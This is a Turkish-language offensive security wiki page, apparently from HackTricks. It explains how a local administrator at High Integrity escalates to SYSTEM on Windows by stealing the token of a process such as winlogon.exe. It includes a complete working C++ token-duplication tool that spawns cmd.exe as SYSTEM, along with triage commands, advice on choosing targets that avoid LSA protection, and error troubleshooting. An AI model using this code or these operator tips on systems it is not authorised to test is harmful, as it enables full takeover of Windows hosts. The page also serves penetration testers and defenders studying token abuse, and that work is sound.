# High'dan System'e SeImpersonate

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, **korumasız bir SYSTEM process'ini açarak, token'ını kopyalayarak ve bu token ile bir child process başlatarak**, **High Integrity administrator process**'inden **`NT AUTHORITY\SYSTEM`**'e geçişin **manual** yöntemini açıklar.

Yalnızca **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** yetkilerine sahipseniz ancak uygun bir SYSTEM process'ini açamıyorsanız, **Potato / named-pipe** yöntemi genellikle daha güvenilirdir:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

İstediğiniz yalnızca `SYSTEM` değil, aynı zamanda mümkün olduğunca fazla privilege içeren bir **SYSTEM token** ise şuna da bakın:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Hızlı triage

Bir token çalmayı denemeden önce context'i hızlıca doğrulayın:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Pratik notlar:

- **High Integrity** admin token'ı genellikle **SeDebugPrivilege** özelliğini etkinleştirmek ve korumasız birçok SYSTEM process'ini açmak için yeterlidir.
- **`CreateProcessWithTokenW`, çağıran tarafta `SeImpersonatePrivilege` olmasını gerektirir.** Bu API `1314` hatasıyla başarısız olursa, SYSTEM primary token'ını zaten duplicate ettiğiniz durumda **`CreateProcessAsUserW`** kullanın.
- Modern Windows'ta **`lsass.exe` genellikle kötü bir hedeftir**; çünkü **LSA protection / PPL**, **SeDebugPrivilege** özelliğine sahip administrator'lar için bile erişimi engeller. Bunun yerine **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** veya SYSTEM olarak çalışan erken bir **`svchost.exe`** tercih edin.
- Her SYSTEM process'i aynı derecede kullanışlı bir token'a sahip değildir. SYSTEM elde ettiğiniz halde eksik privilege'lar fark ederseniz, tekniğin bozuk olduğunu varsaymak yerine farklı bir SYSTEM process'i deneyin.

## PID'yi dikkatlice seçin

Bu işlemi güvenilir şekilde gerçekleştirmenin en kolay yolu, **DACL'ı Administrators'ın process'i sorgulamasına ve token'ını duplicate etmesine gerçekten izin veren bir SYSTEM process'i seçmektir**.

Önce test edilebilecek iyi adaylar:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM olarak çalışan bazı erken `svchost.exe` örnekleri

Varsayılan olarak kaçının:

- **RunAsPPL / LSA protection** etkin olan host'larda `lsass.exe`
- **SeDebugPrivilege** etkinleştirildikten sonra bile `Access denied` döndüren protected / security-sensitive process'ler

Elevated olarak çalışan **Process Explorer** veya **Process Hacker** ile aday process'leri ve bunların token/ACL'lerini inceleyebilirsiniz.

### Code

Aşağıdaki code [buradan](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) alınmıştır. **Bir Process ID'nin argument olarak belirtilmesine** ve belirtilen process'in **user'ı olarak çalışan bir CMD'nin** başlatılmasına olanak tanır.\
High Integrity bir process içinde çalışırken **System olarak çalışan bir process'in PID'sini** (`winlogon`, `wininit` gibi) **belirtebilir** ve SYSTEM olarak bir `cmd.exe` çalıştırabilirsiniz.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Kullanışlı API / access-right notları

Örnek `MAXIMUM_ALLOWED` kullanıyor, ancak gerçek işlemler için gereken minimum parçaları hatırlamak faydalıdır:

- `OpenProcessToken()` yalnızca **process handle**'ın **`PROCESS_QUERY_LIMITED_INFORMATION`** ile açılmış olmasını gerektirir.
- `CreateProcessWithTokenW()` kullanmak için **primary token handle**'ın **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** haklarına sahip olması gerekir.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` yalnızca bir impersonation token değil, bir **primary token** (`TokenPrimary`) oluşturmalıdır.
- SYSTEM olarak zaten impersonate ettiyseniz ve `CreateProcessWithTokenW()` yine de `1314` hatasıyla başarısız oluyorsa bunun yerine `CreateProcessAsUserW()` deneyin.

Bu, token'ı sorgulamak için gereken hakları istemek yerine hedef process'i **`PROCESS_ALL_ACCESS`** ile açmanın genellikle gereksiz ve daha fazla gürültü oluşturan bir işlem olduğu anlamına gelir.

## Hata

Bazı durumlarda System'ı impersonate etmeyi deneyebilir ve aşağıdakine benzer bir çıktı görerek işlemin çalışmadığını fark edebilirsiniz:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Bu, High Integrity level üzerinde çalışıyor olsanız bile söz konusu process/token üzerinde **yeterli permissions'a sahip olmadığınız** anlamına gelir.\
**Process Explorer** ile `svchost.exe` process'leri üzerindeki mevcut Administrator permissions'larını kontrol edelim (alternatif olarak **Process Hacker** da kullanabilirsiniz):

1. Bir `svchost.exe` process'i seçin
2. Sağ tıklayın --> Properties
3. "Security" Tab'ında sağ altta bulunan "Permissions" butonuna tıklayın
4. "Advanced" seçeneğine tıklayın
5. "Administrators" seçin ve "Edit" seçeneğine tıklayın
6. "Show advanced permissions" seçeneğine tıklayın

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Önceki image, "Administrators" grubunun seçilen process üzerinde sahip olduğu tüm privilege'ları içerir (`svchost.exe` için gördüğünüz gibi yalnızca "Query" privilege'larına sahiptirler).

"Administrators" grubunun `winlogon.exe` üzerinde sahip olduğu privilege'lara bakın:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Bu process içinde "Administrators", "Read Memory" ve "Read Permissions" işlemlerini gerçekleştirebilir; bu da muhtemelen Administrators'ın bu process tarafından kullanılan token'ı impersonate etmesine olanak tanır.

### Yaygın failure nedenleri

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL'i sizi engelliyor olabilir veya hedef **protected/PPL** durumunda olabilir. Başka bir SYSTEM process'i seçin.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: token handle'ınız yeterli rights olmadan açılmış olabilir veya hedef token'ın DACL'i duplication işlemini engelliyor olabilir.
- **`CreateProcessWithTokenW()` -> `1314`**: caller'ın şu anda **`SeImpersonatePrivilege`** privilege'ı enabled durumda değil. Önce bunu enable etmeyi deneyin veya duplicated primary token ile `CreateProcessAsUserW()` kullanın.
- Önceki failure'ların ardından **`CreateProcessWithTokenW()` -> `1326`**: bu genellikle önceki token duplication/impersonation adımının başarısız olduğu ve child process'i başlatmak için kullanılabilir bir primary token bulunmadığı anlamına gelir.

## Operatör notları

- Bu technique, zaten **local admin + high integrity** durumundaysanız ve bir service başlatmadan veya named-pipe coercion chain oluşturmadan SYSTEM'e ulaşmak için hızlı ve manuel bir yol istiyorsanız oldukça kullanışlıdır.
- Hardened Windows 11 / Server ortamlarında **LSA protection** giderek daha yaygın hale geliyor; bu nedenle `lsass.exe` dosyasının her zaman okunabilir olduğunu varsayan bir workflow güvenilir değildir. **`winlogon.exe` / `wininit.exe` / `services.exe` genellikle daha iyi ilk tercihlerdir**.<sup>[[2]](#references)</sup>
- Elevated bir admin desktop yerine **service account** context'inde erişim elde ederseniz, **Potato family** genellikle bu sayfadaki technique'ten daha uygundur.



## Referanslar

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Understanding and Abusing Process Tokens — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
